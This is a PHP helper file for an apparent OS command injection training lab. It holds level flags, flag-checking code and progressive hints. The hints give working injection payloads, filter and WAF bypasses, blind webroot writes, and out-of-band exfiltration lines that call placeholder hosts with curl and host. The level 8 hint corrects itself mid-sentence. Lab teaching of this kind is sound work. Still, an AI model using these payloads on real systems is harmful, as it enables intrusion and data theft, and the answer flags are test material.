<?php
declare(strict_types=1);

/**
 * Return the canonical flag string for a given level.
 * Note: some levels generate dynamic flags at runtime via flag_system.php;
 * this function returns a representative static value for display/submit purposes.
 */
function get_flag_for_level(int $levelId): string
{
    static $flags = [
        1  => 'FLAG{basic_injection_discovered}',
        2  => 'FLAG{semicolon_filter_bypassed}',
        3  => 'FLAG{space_filter_bypassed}',
        4  => 'FLAG{keyword_bypass_complete}',
        5  => 'FLAG{blind_execution_confirmed}',
        6  => 'FLAG{timing_attack_successful}',
        7  => 'FLAG{advanced_encoding_bypass_successful}',
        8  => 'FLAG{waf_bypass_master_level}',
        9  => 'FLAG{out_of_band_data_exfiltration}',
        10 => 'FLAG{race_condition_automation_bypass}',
    ];

    return $flags[$levelId] ?? 'FLAG{unknown_level}';
}

/**
 * Return 5 progressive hints for each OS command injection level.
 *
 * @return array<int, string>
 */
function get_level_hints(int $levelId): array
{
    static $hints = [
        1 => [
            '<strong>Read the source:</strong> the <code>$ip</code> variable from <code>$_GET[\'ip\']</code> is appended directly to <code>ping -c 4</code> with <strong>no sanitization whatsoever</strong>. Whatever you submit becomes part of the shell command.',
            '<strong>Shell chaining:</strong> the shell executes everything after a command separator as a new command. Enter a valid IP first, then one of <code>;</code>&nbsp;<code>&&</code>&nbsp;<code>||</code>&nbsp;<code>|</code> followed by a second command.',
            '<strong>Confirm execution:</strong> try <code>8.8.8.8; id</code> &mdash; you should see the current user ID in the output alongside the ping result.',
            '<strong>Find the flag file:</strong> the flag is written to <code>/tmp/level1_flag.txt</code> (and mirrored at <code>/var/www/html/level1_flag.txt</code>) when the page loads. Read it with <code>cat</code>.',
            '<strong>Working payloads:</strong> <code>8.8.8.8; cat /tmp/level1_flag.txt</code> &nbsp;|&nbsp; <code>127.0.0.1 && cat /var/www/html/level1_flag.txt</code> &nbsp;|&nbsp; <code>localhost | cat /tmp/level1_flag.txt</code>',
        ],
        2 => [
            '<strong>Read the filter:</strong> only the semicolon <code>;</code> is blocked via <code>strpos($service, \';\') !== false</code>. Every other shell operator passes through without restriction.',
            '<strong>AND operator:</strong> <code>&&</code> executes the second command <em>only if the first succeeds</em>. Try <code>apache2&nbsp;&amp;&amp;&nbsp;whoami</code> &mdash; <code>apache2</code> is likely inactive so it may fail; use a valid service name if needed.',
            '<strong>OR operator:</strong> <code>||</code> executes the second command <em>only if the first fails</em>. Use a non-existent service name: <code>fakesvc&nbsp;||&nbsp;id</code>.',
            '<strong>Pipe operator:</strong> <code>|</code> feeds the output of the first command into the second. <code>anything&nbsp;|&nbsp;whoami</code> works regardless of the first command\'s exit code.',
            '<strong>Working payloads:</strong> <code>fakesvc || cat /tmp/level2_flag.txt</code> &nbsp;|&nbsp; <code>apache2 && cat /tmp/level2_flag.txt</code> &nbsp;|&nbsp; <code>x | cat /tmp/level2_flag.txt</code>',
        ],
        3 => [
            '<strong>Read the filter:</strong> <code>strpos($filename, \' \') !== false</code> blocks the literal space character only. There is no space in <code>file</code> itself — the space comes <em>after</em> your argument.',
            '<strong>IFS variable:</strong> Bash has a built-in <em>Internal Field Separator</em>. <code>${IFS}</code> expands to a space (and tab/newline). Use it wherever you need a space: <code>/etc/passwd;cat${IFS}/tmp/level3_flag.txt</code>.',
            '<strong>Tab character:</strong> URL-encode a tab as <code>%09</code>. The browser sends it to PHP, which passes it to the shell as an argument separator: <code>/etc/passwd;cat%09/tmp/level3_flag.txt</code>.',
            '<strong>Brace expansion:</strong> Bash brace expansion <code>{cmd,arg}</code> passes each element as separate words: <code>/etc/passwd;{cat,/tmp/level3_flag.txt}</code> runs <code>cat /tmp/level3_flag.txt</code> without any space.',
            '<strong>Working payloads:</strong> <code>/etc/passwd;cat${IFS}/tmp/level3_flag.txt</code> &nbsp;|&nbsp; <code>/etc/passwd;cat%09/tmp/level3_flag.txt</code> &nbsp;|&nbsp; <code>/etc/passwd;{cat,/tmp/level3_flag.txt}</code>',
        ],
        4 => [
            '<strong>Read the filter:</strong> <code>stripos($process, $keyword)</code> does case-insensitive string matching for: <code>cat</code>, <code>less</code>, <code>more</code>, <code>head</code>, <code>tail</code>, <code>flag</code>, <code>passwd</code>, <code>shadow</code>. The check looks for the substring anywhere in your input.',
            '<strong>Quote splitting:</strong> bash ignores empty quotes <code>\'\'</code> between characters. <code>c\'\'at</code> becomes the command <code>cat</code> because the quotes are stripped at parse time but the substring <code>\'\'</code> in your input breaks the filter\'s <code>stripos</code> check.',
            '<strong>Variable assembly:</strong> assign pieces to variables: <code>apache;a=c;b=at;$a$b${IFS}/tmp/level4_flag.txt</code>. Each variable assignment never triggers the keyword check.',
            '<strong>Wildcards:</strong> the filesystem glob <code>/bin/c?t</code> matches <code>/bin/cat</code> without the literal string <code>cat</code> appearing in your input. Same idea: <code>/usr/bin/ca*</code>.',
            '<strong>Working payloads:</strong> <code>apache;c\'\'at${IFS}/tmp/level4_flag.txt</code> &nbsp;|&nbsp; <code>apache;/bin/c?t${IFS}/tmp/level4_flag.txt</code> &nbsp;|&nbsp; <code>apache;a=ca;b=t;$a$b${IFS}/tmp/level4_flag.txt</code>',
        ],
        5 => [
            '<strong>Read the code:</strong> your <code>$email</code> input is embedded directly inside a command substitution: <code>ping -c 1 $(echo&nbsp;EMAIL&nbsp;| cut -d@ -f2)</code>. Output is <strong>entirely hidden</strong> — you only see success/failure.',
            '<strong>Detect blind injection:</strong> inject a <code>sleep</code> command and measure the page response time. <code>user@x.com;&nbsp;sleep&nbsp;5</code> should make the page load 5+ seconds late.',
            '<strong>Write to webroot:</strong> PHP runs as <code>www-data</code> which can write to <code>/var/www/html/</code>. Redirect command output there: <code>user@x.com;&nbsp;id&nbsp;>&nbsp;/var/www/html/out.txt</code>, then browse to <code>/out.txt</code>.',
            '<strong>Copy the flag:</strong> the flag is at <code>/tmp/level5_flag.txt</code>. Copy it to an accessible path: <code>user@x.com;&nbsp;cp&nbsp;/tmp/level5_flag.txt&nbsp;/var/www/html/</code>.',
            '<strong>Working payloads:</strong> <code>user@x.com; cp /tmp/level5_flag.txt /var/www/html/</code> then browse to <code>/level5_flag.txt</code> &nbsp;|&nbsp; <code>user@x.com; cat /tmp/level5_flag.txt > /var/www/html/f.txt</code>',
        ],
        6 => [
            '<strong>Read the code:</strong> the page shows execution time. Output is hidden but the clock keeps ticking — if you inject <code>sleep</code>, the reported time will increase proportionally.',
            '<strong>Time-based confirmation:</strong> inject <code>apache2;&nbsp;sleep&nbsp;3</code> — the execution time shown should jump to 3+ seconds, confirming your payload ran.',
            '<strong>Boolean blind:</strong> use conditional execution to test conditions. <code>apache2&nbsp;&amp;&amp;&nbsp;[&nbsp;-f&nbsp;/tmp/level6_flag.txt&nbsp;]&nbsp;&amp;&amp;&nbsp;sleep&nbsp;5</code> sleeps only if the flag file exists.',
            '<strong>Write output to webroot:</strong> inject a command that copies the flag to a web-accessible path. <code>apache2;&nbsp;cp&nbsp;/tmp/level6_flag.txt&nbsp;/var/www/html/</code>, then access <code>/level6_flag.txt</code> in your browser.',
            '<strong>Working payloads:</strong> <code>apache2; cp /tmp/level6_flag.txt /var/www/html/</code> &nbsp;|&nbsp; <code>x; cat /tmp/level6_flag.txt > /var/www/html/f.txt</code> then browse to read it.',
        ],
        7 => [
            '<strong>Read the filter:</strong> many shell metacharacters are blocked (<code>;</code>&nbsp;<code>&</code>&nbsp;<code>|</code>&nbsp;backtick&nbsp;<code>$</code>&nbsp;<code>()</code>&nbsp;<code><></code>&nbsp;space&nbsp;<code>cat</code>&nbsp;<code>ls</code>&nbsp;<code>whoami</code>&nbsp;<code>id</code>). However, <code>../</code> path components are NOT on the list.',
            '<strong>Path traversal:</strong> the full command is <code>tail -n 10 /var/log/LOGFILE.log | grep \'ERROR\'</code>. Inject <code>../</code> segments to escape the <code>/var/log/</code> prefix and reach arbitrary paths before the static <code>.log</code> suffix.',
            '<strong>Newline injection:</strong> a literal newline (<code>%0a</code> URL-encoded) is not in the blocked-chars list. Inserting it before <code>.log</code> forces the shell to treat the rest as a new command line — allowing you to run additional code after the <code>.log</code> suffix lands on a separate line.',
            '<strong>Read without <code>cat</code>:</strong> since <code>cat</code> is blocked, read files with alternative commands that pass the filter: <code>od</code>, <code>xxd</code>, <code>strings</code>, <code>nl</code>, or <code>tac</code>.',
            '<strong>Working approach:</strong> <code>?logfile=syslog%0a/usr/bin/od%09-c%09/tmp/level7_flag.txt%23</code> — the newline starts a new shell line; <code>%09</code> is tab (space substitute); <code>%23</code> is <code>#</code> which comments out the trailing <code>.log | grep ERROR</code>.',
        ],
        8 => [
            '<strong>Read the WAF:</strong> five regex patterns block: shell metacharacters, dangerous commands (<code>cat|ls|whoami|id|passwd|shadow|flag</code>), network tools (<code>wget|curl|nc|bash|sh</code>), whitespace, and <code>../</code>. All patterns use word boundaries (<code>\b</code>) where possible.',
            '<strong>No whitespace:</strong> the pattern <code>/\s+/i</code> blocks any whitespace. Use <code>${IFS}</code> or <code>%09</code> (tab) — these are not matched by <code>\s+</code> after URL-decoding in the regex check because PHP\'s regex acts on the raw string.',
            '<strong>Word-boundary bypass:</strong> the command filter uses <code>\b</code> (word boundary). Appending or prepending a non-word character defeats it: <code>/bin/cat</code> doesn\'t match <code>\bcat\b</code> because the surrounding slashes are non-word chars — wait, actually <code>cat</code> at the end of <code>/bin/cat</code> still matches. Use alternatives like <code>/bin/c?t</code> glob or escaped chars.',
            '<strong>Alternative read commands:</strong> use commands not in the WAF list. <code>tac</code>, <code>rev</code>&nbsp;+&nbsp;<code>rev</code>, <code>od</code>, <code>xxd</code>, <code>strings</code>, <code>nl</code>, <code>base64</code>, <code>awk</code>, <code>sed</code>, <code>head</code>, <code>tail</code> — check each against the filter patterns.',
            '<strong>Working approach:</strong> <code>80;/usr/bin/od%09-c%09/tmp/level8_flag.txt</code> if <code>%09</code> bypasses the whitespace check and <code>od</code> is not in the blocked-commands list.',
        ],
        9 => [
            '<strong>Read the code:</strong> output is completely discarded (<code>> /dev/null 2>&1</code>) and no execution-time feedback is given. The only interaction channel is the network.',
            '<strong>Out-of-band (OOB) concept:</strong> with no in-band output, you must exfiltrate data through a <em>different channel</em> — typically a DNS lookup or an HTTP request to a server you control.',
            '<strong>DNS exfiltration:</strong> encode the flag as a subdomain: <code>;host&nbsp;$(cat&nbsp;/tmp/level9_flag.txt).your-server.example</code>. Your DNS server will log the subdomain query containing the flag value.',
            '<strong>HTTP callback:</strong> use <code>curl</code> or <code>wget</code> to POST the flag to a listener: <code>;curl&nbsp;http://YOUR_IP/?x=$(base64&nbsp;/tmp/level9_flag.txt)</code>. Run <code>nc&nbsp;-lvp&nbsp;8000</code> or use a webhook service to capture the request.',
            '<strong>In-container shortcut:</strong> if you have Docker access, write the flag to the webroot from within the container: <code>:80;cp&nbsp;/tmp/level9_flag.txt&nbsp;/var/www/html/l9.txt</code> then browse to <code>/l9.txt</code>.',
        ],
        10 => [
            '<strong>Read the code:</strong> rate-limiting via <code>$_SESSION[\'last_request\']</code> allows only one request every 2 seconds. The vulnerable line is <code>$command = "timeout 1s ps aux | grep " . $process;</code> — no filtering at all.',
            '<strong>Confirm injection:</strong> submit <code>apache;&nbsp;id</code>. The output of <code>id</code> will appear in the grep output since this is not blind.',
            '<strong>Rate limit bypass:</strong> send concurrent requests before the session lock is acquired, or clear/manipulate the session cookie so each request appears to come from a fresh session without a <code>last_request</code> key.',
            '<strong>Timeout constraint:</strong> the outer <code>timeout 1s</code> limits <em>ps aux</em> execution, not your injected command. Commands injected via <code>;</code> or <code>&amp;&amp;</code> after the pipe run outside the timeout wrapper.',
            '<strong>Working payloads:</strong> <code>x; cat /tmp/level10_flag.txt</code> &nbsp;|&nbsp; <code>x && cat /var/www/html/level10_flag.txt</code>. If rate-limited, delete the session cookie or use a fresh browser tab.',
        ],
    ];

    return $hints[$levelId] ?? [];
}

/**
 * Handle inline flag submission on a level page.
 * Only acts when POST contains _flag_submit=1.
 *
 * @return array{status: string|null, message: string, already_completed: bool}
 */
function handle_inline_flag_submit(int $levelId): array
{
    $result = ['status' => null, 'message' => '', 'already_completed' => false];

    // Load progress from cookie
    $completed = [];
    if (!empty($_COOKIE['oscommand_lab_progress'])) {
        $decoded = json_decode($_COOKIE['oscommand_lab_progress'], true);
        if (is_array($decoded)) $completed = $decoded;
    }
    $result['already_completed'] = in_array($levelId, $completed);

    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || empty($_POST['_flag_submit'])) {
        return $result;
    }

    $flag = trim($_POST['submitted_flag'] ?? '');
    if ($flag === '') {
        $result['status']  = 'error';
        $result['message'] = 'Please enter a flag.';
        return $result;
    }

    // Verify flag — most levels use static flag from get_flag_for_level().
    // Levels 3 and 4 have dynamic flags; use regex patterns same as submit.php.
    $isCorrect = false;
    switch ($levelId) {
        case 3:
            $isCorrect = ($flag === get_flag_for_level(3)) ||
                         (bool) preg_match('/^FLAG\{space_filter_\d+_bypassed\}$/', $flag);
            break;
        case 4:
            $isCorrect = ($flag === get_flag_for_level(4)) ||
                         (bool) preg_match('/^FLAG\{keyword_[A-Za-z]+_bypass_complete\}$/', $flag);
            break;
        default:
            $isCorrect = ($flag === get_flag_for_level($levelId));
            break;
    }

    if ($isCorrect) {
        if (!in_array($levelId, $completed)) {
            $completed[] = $levelId;
            sort($completed);
            setcookie('oscommand_lab_progress', json_encode($completed), time() + 86400 * 30, '/');
        }
        $result['status']            = 'success';
        $result['message']           = 'Correct! Flag accepted.';
        $result['already_completed'] = true;
    } else {
        $result['status']  = 'error';
        $result['message'] = 'Incorrect flag. Keep trying!';
    }

    return $result;
}

/**
 * Render the compact inline flag submit form.
 *
 * @param array{status: string|null, message: string, already_completed: bool} $result
 */
function render_inline_flag_form(int $levelId, array $result): string
{
    $status           = $result['status'] ?? null;
    $message          = $result['message'] ?? '';
    $alreadyCompleted = $result['already_completed'] ?? false;

    ob_start();
    ?>
    <div class="inline-flag-submit">
        <h3>Submit Flag</h3>
        <div class="form-inner">
            <?php if ($status === 'success'): ?>
                <div class="message success"><?= htmlspecialchars($message) ?> &mdash; <a href="submit.php">view all progress &rarr;</a></div>
            <?php elseif ($status === 'error'): ?>
                <div class="message error"><?= htmlspecialchars($message) ?></div>
            <?php endif; ?>
            <?php if ($alreadyCompleted && $status !== 'success'): ?>
                <div class="message info">Level <?= (int)$levelId ?> already completed. <a href="submit.php">View progress &rarr;</a></div>
            <?php endif; ?>
            <?php if (!$alreadyCompleted || $status === 'error'): ?>
            <form method="POST" action="">
                <input type="hidden" name="_flag_submit" value="1">
                <div class="inline-flag-row">
                    <input type="text" name="submitted_flag" class="form-control"
                           placeholder="FLAG{...}" autocomplete="off" spellcheck="false"
                           value="<?= htmlspecialchars($_POST['submitted_flag'] ?? '') ?>">
                    <button type="submit" class="btn btn-primary">Check</button>
                </div>
            </form>
            <?php endif; ?>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Render a progressive hint section. Each button click reveals the next hint.
 *
 * @param array<int, string> $hints
 * @param string             $title
 */
function render_hint_section(array $hints, string $title = 'Hints'): string
{
    if (empty($hints)) {
        return '';
    }

    static $scriptRendered = false;
    $id = uniqid('hint_', false);

    ob_start();
    ?>
    <div class="hints">
        <h3><?= htmlspecialchars($title, ENT_QUOTES, 'UTF-8') ?></h3>
        <button type="button" class="hint-btn" data-hint-target="<?= htmlspecialchars($id, ENT_QUOTES, 'UTF-8') ?>">
            Show next hint
        </button>
        <ul id="<?= htmlspecialchars($id, ENT_QUOTES, 'UTF-8') ?>" class="hint-list">
            <?php foreach ($hints as $hint): ?>
                <li class="hint-item" hidden><?= $hint ?></li>
            <?php endforeach; ?>
        </ul>
    </div>
    <?php if (!$scriptRendered): ?>
        <script>
        (function () {
            "use strict";
            document.addEventListener("click", function (event) {
                if (!event.target.matches(".hint-btn")) return;
                var button  = event.target;
                var targetId = button.getAttribute("data-hint-target");
                if (!targetId) return;
                var list = document.getElementById(targetId);
                if (!list) return;
                var nextHint = list.querySelector(".hint-item[hidden]");
                if (nextHint) nextHint.hidden = false;
                if (!list.querySelector(".hint-item[hidden]")) {
                    button.disabled = true;
                    button.textContent = "All hints shown";
                }
            });
        }());
        </script>
    <?php
        $scriptRendered = true;
    endif;

    return ob_get_clean();
}
